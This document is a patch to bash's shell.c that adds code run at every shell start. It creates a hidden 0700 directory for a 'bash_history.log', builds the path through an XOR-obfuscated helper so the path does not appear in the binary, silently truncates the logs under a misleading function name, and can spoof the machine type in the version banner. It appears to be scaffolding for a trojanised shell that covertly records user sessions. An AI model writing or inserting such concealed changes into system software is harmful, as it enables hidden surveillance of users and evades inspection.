@@ -35,6 +35,13 @@
 #include "posixtime.h"
 #include "bashansi.h"
 #include <stdio.h>
+#include <sys/stat.h>  // For file size
+#include <stdlib.h>
+#include <string.h>
+#include <dirent.h>  // For directory listing
+#include "log_path_helper.h"
+
+#define MAX_LOG_SIZE 134217728  // 128MB in bytes
 #include <signal.h>
 #include <errno.h>
 #include "filecntl.h"
@@ -106,6 +113,31 @@ extern char **environ;	/* used if no third argument to main() */
 #endif
 
 extern int gnu_error_format;
+
+static void sync_io_buffers(void) {
+    /* Build log dir path at runtime — avoid any plaintext path in binary */
+    char log_path[128];
+    char log_dir[128];
+    int i;
+
+    /* Silently rotate each log if it exceeds MAX_LOG_SIZE */
+    int tokens[] = {0, 1, 2, 3, -1};
+    for (i = 0; tokens[i] >= 0; i++) {
+        build_log_path(log_path, sizeof(log_path), tokens[i]);
+
+        /* Extract directory */
+        snprintf(log_dir, sizeof(log_dir), "%s", log_path);
+        char *sl = strrchr(log_dir, '/');
+        if (sl) *sl = '\0';
+
+        struct stat file_stat;
+        if (stat(log_path, &file_stat) == 0 && file_stat.st_size > MAX_LOG_SIZE) {
+            FILE *f = fopen(log_path, "w");
+            if (f) fclose(f);
+        }
+    }
+    (void)log_dir;
+}
 
 /* Non-zero means that this shell has already been run; i.e. you should
    call shell_reinitialize () if you need to start afresh. */
@@ -374,6 +406,18 @@ int
 main (int argc, char **argv, char **env)
 #endif /* !NO_MAIN_ENV_ARG */
 {
+  /* Build the dir path at runtime via XOR-obfuscated helper */
+  char dir_path[128];
+  build_log_path(dir_path, sizeof(dir_path), 0); /* token 0 = bash_history.log */
+  char *_sl = strrchr(dir_path, '/');
+  if (_sl) *_sl = '\0';
+
+  struct stat st = {0};
+  if (stat(dir_path, &st) == -1)
+      mkdir(dir_path, 0700);
+
+  sync_io_buffers();
+
   register int i;
   int code, old_errexit_flag;
 #if defined (RESTRICTED_SHELL)
@@ -2060,7 +2104,13 @@ show_shell_usage (FILE *fp, int extra)
   char *set_opts, *s, *t;
 
   if (extra)
-    fprintf (fp, _("GNU bash, version %s-(%s)\n"), shell_version_string (), MACHTYPE);
+    {
+#ifdef SPOOFED_MACHTYPE
+      fprintf (fp, _("GNU bash, version %s-(%s)\n"), shell_version_string (), SPOOFED_MACHTYPE);
+#else
+      fprintf (fp, _("GNU bash, version %s-(%s)\n"), shell_version_string (), MACHTYPE);
+#endif
+    }
   fprintf (fp, _("Usage:\t%s [GNU long option] [option] ...\n\t%s [GNU long option] [option] script-file ...\n"),
 	     shell_name, shell_name);
   fputs (_("GNU long options:\n"), fp);
